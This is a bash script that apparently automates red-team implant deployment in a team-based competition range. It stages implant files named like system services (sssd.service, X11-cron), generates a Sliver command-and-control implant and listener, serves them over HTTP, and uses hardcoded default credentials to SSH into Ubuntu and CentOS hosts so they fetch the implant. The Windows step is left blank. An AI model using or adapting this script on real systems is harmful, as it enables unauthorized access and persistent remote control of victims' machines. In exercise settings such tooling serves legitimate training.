#!/bin/bash

# Prompt for the Team ID
echo -n "Enter Team ID: "
read team_id

# Validate input
if [[ ! "$team_id" =~ ^[0-9]$ ]]; then
	echo "Invalid Input! Please Enter A Number (0-9)."
	exit 1
fi

# Get IP Address
ip_address=$(ifconfig eth0 | grep 'inet ' | awk '{print $2}')

if [[ -z "$ip_address" ]]; then
	echo "No IP Address found for eth0"
else
	echo "Your IP Address Is: $ip_address"
fi

# Copy Files To Stage Folder
mkdir ~/Desktop/Implants
cp ~/Desktop/Files/sssd.service ~/Desktop/Implants/sssd.service
cp X11-cron ~/Desktop/Implants/X11-cron

# Set Variables
windows_ip="10.0.10.${team_id}4"
centos_ip="10.0.10.${team_id}3"
ubuntu_ip="10.0.10.${team_id}2"

ubuntu_user="sysadmin"
ubuntu_pass="changeme"

centos_user="sysadmin"
centos_pass="changeme"

windows_user=""
windows_pass=""

# Generate Sliver Implant and Listener
./SliverInteract.exp $ip_address

# Serve the Files
qterminal -e bash -c "cd ~/Desktop/Implants; python -m http.server 8090; exec bash" &

cd ../
# SSH -> Curl the Implant (Ubuntu)
./ConSSH.exp $ip_address $ubuntu_ip $ubuntu_user $ubuntu_pass

# SSH -> Curl the Implant (CentOS)
./ConSSH.exp $ip_address $centos_ip $centos_user $centos_pass

# WINRM -> Curl the Implant (Windows)
